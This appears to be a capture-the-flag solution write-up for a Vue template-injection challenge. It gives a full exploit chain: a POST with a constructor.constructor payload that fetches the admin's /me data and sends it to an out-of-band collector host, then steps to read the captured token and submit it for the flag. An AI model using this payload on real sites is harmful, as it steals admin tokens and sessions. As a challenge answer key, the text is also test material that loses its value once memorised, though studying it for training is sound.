Full chain:

```
POST /widget
Content-Type: application/json

{"template":"<span>{{ constructor.constructor(\"fetch('/me').then(r=>r.text()).then(t=>{new Image().src='http://collector:9000/report?m='+encodeURIComponent(t)})\")() }}</span>"}
```

Wait a few seconds for the admin bot to load `/admin/dashboard` (it Vue.compile()s
your template). Then:

```
GET /oob/received
```

Find the item with a path like `/report?m=…` containing the admin token (32 hex).
Submit it:

```
POST /solve   {"c":"<32 hex>"}
```

and you get `FLAG{…}`. `tests/exploit.py` runs the whole flow.
